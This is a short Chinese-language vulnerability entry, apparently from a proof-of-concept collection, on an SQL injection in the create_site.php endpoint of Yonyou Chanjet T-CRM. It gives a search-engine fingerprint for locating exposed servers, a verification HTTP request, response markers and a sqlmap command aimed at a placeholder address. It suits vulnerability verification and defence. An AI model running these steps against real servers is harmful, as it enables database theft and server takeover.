﻿# 用友畅捷通CRM create_site.php SQL 注入漏洞

> 更新时间：2024-04-29

> 漏洞编号：

> 漏洞说明：用友畅捷通T-CRM是用友公司全力打造的一款基于B/S架构、拥有强大自定义功能、多部门协作(市场、销售和服务)、基于客户全生命周期管理的客户关系管理软件。客户通主要面向成长型中小企业，以客户为中心，以客户营销为目的，帮助他们 " 提升营销能力，网罗天下商机"。畅捷CRM系统create_site.php存在SQL注入漏洞 ，攻击者可以利用该漏洞获取网站后台数据库敏感信息，甚至接管服务器权限，构成严重风险。

> 漏洞特征：鹰图：web.icon=="223dcd70f982801e9177078a818a9b59"

> 验证脚本：HTTP

```
GET /webservice/create_site.php?site_id=1 HTTP/1.1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

> 响应代码特征：200

> 响应内容特征：register

> 上传文件定位：

> 验证文件来源：用友畅捷通CRM create_site.php SQL 注入漏洞.poc

```
python sqlmap.py -u 'http://xxx.xxx.xxx.xxx/webservice/create_site.php?site_id=1'
```